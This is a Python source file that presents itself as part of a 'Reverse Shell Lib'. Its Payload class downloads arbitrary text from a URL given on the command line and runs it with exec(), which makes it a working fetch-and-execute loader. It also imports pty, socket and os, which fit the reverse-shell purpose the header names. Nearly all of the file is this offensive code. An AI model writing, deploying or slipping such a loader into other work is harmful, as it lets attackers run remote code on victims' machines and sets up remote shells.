'''
    Copyright 2021 by Zackary Morvan, Cyber M Technologies.
    All rights reserved
    This file is part of the Reverse Shell Lib (RSL), and is released 
    under the "MIT License Agreement". Please see the LICENSE file that
    should have been included as a part of this package
'''

import sys
import requests
import validators
import socket
import os
import sys
import pty
import time

class Payload:
    def __init__(self, http_path):
        self.http_route = http_path
        self.fetchPayload()

    def fetchPayload(self):
        payload = requests.get(self.http_route)
        self.payload = payload.text

        print(f"Payload loaded in memory:\n{self.payload}")
        return

    def executePayload(self):
        exec(self.payload)
        

if __name__ == "__main__":
    args = sys.argv

    if len(args) < 2:
        sys.exit("No route to fetch from . . .")
    else:
        if validators.url(args[1]) == True:
            PAYLOAD = Payload(args[1])
            PAYLOAD.executePayload()
        else:
            sys.exit("Invalid route to fetch from . . .")